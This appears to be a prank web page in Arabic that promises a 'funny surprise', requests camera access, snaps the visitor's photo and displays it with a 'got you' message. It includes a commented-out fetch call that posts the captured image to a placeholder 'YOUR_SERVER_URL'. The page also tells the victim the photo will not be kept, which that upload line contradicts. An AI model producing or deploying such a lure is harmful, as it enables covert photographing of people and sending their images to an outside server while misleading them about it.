<!DOCTYPE html>
<html>
<body>
  <h1>أدخل لترى مفاجأة مضحكة! 😜</h1>
  <video id="video" width="300" autoplay></video>
  <button onclick="capture()" style="display: none;">التقط الصورة!</button>
  
  <script>
    const video = document.getElementById('video');
    let isCameraAllowed = false;

    // طلب إذن الكاميرا
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        document.querySelector('button').style.display = 'block';
        isCameraAllowed = true;
      })
      .catch(err => {
        alert('لن تعمل المفاجأة دون إذن الكاميرا!');
      });

    // التقاط الصورة
    function capture() {
      if (!isCameraAllowed) return;

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const img = canvas.toDataURL('image/png');
      
      // إرسال الصورة إلى خادمك (مطلوب خادم باك إند)
      // fetch('YOUR_SERVER_URL', { method: 'POST', body: img });
      
      // عرض الصورة للمستخدم كنكتة
      document.body.innerHTML = `
        <h1>هاها! انقرطت عليك! 🤣</h1>
        <img src="${img}" width="300">
        <p>لن أحتفظ بالصورة، هذه مجرد نكتة!</p>
      `;
    }
  </script>
</body>
</html>
